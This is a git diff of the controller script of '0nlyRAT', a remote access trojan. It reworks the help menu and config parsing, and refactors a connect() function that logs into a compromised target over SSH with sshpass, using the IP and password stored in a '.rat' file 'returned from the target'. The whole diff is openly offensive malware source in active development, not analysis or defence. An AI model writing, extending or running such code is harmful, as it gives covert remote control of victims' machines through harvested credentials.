@@ -24,13 +24,19 @@ banner = r"""
 """
 
 help_menu = """
-        [::] 0nlyRAT help menu [::]
-        
-        Arguments: 
-        -f  <config file>   = place the config file name with extension returned from the target
+            [::] 0nlyRAT help menu [::]
 
-        Example:
-        python3 main.py -f <config file>
+            Arguments:            
+                                   ____                                                               ____  
+                                  |                                                                       |
+                                  |  place the config file name with extension returned from the target   |
+            -f  <config file>   = |                                                                       |
+                                  |  File must have .rat extension                                        |
+                                  |____                                                               ____|
+            
+            
+            Example:
+            python3 main.py -f <config file>
 """
 
 options_menu = """
@@ -47,9 +53,9 @@ PASS_KEY = "PASSWORD"
 WORKINGDIR_KEY = "WORKINGDIR"
 
 def read_config(config_file):
-    if not os.path.exists(config_file):
-        print(f"Error: Config file '{config_file}' does not exist.")
-        return {}
+    if not config_file.endswith(".rat") or not os.path.exists(config_file):
+        print(f"Error: Config file '{config_file}' is not valid.")
+        raise Exception
     configuration = {}
     read_lines = open(config_file, "r").readlines()
     configuration[IP_KEY] = read_lines[0].strip()
@@ -57,18 +63,9 @@ def read_config(config_file):
     configuration[WORKINGDIR_KEY] = read_lines[2].strip()
     return configuration
 
-# connect RAT to target
-def connect():
-    if sys.argv[1] == "-f":
-        configuration = read_config(sys.argv[2])
-        if not configuration:
-            print(help_menu)
-            return
-        tgt_ipv4 = configuration.get(IP_KEY)
-        tgt_pword = configuration.get(PASS_KEY)
-        tgt_wd = configuration.get(WORKINGDIR_KEY)
-        # remotely connect
-        os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")
+# remotely connect RAT to target
+def connect(tgt_ipv4,tgt_pword):
+    os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")
 
 
 def os_detection():
@@ -80,13 +77,18 @@ def os_detection():
 # command line interface
 def cli(arguments):
     print(banner)
-    if arguments:
+    try:
+        if not arguments:
+            raise Exception
+        configuration = read_config(sys.argv[2])
+        tgt_ipv4 = configuration.get(IP_KEY)
+        tgt_pword = configuration.get(PASS_KEY)
+        tgt_wd = configuration.get(WORKINGDIR_KEY)
         print(options_menu)
         option = input(f"{header}")
         if option == "0":
-            connect()
-
-    else:
+            connect(tgt_ipv4,tgt_pword)
+    except Exception:
         print(help_menu)
 
 def main():
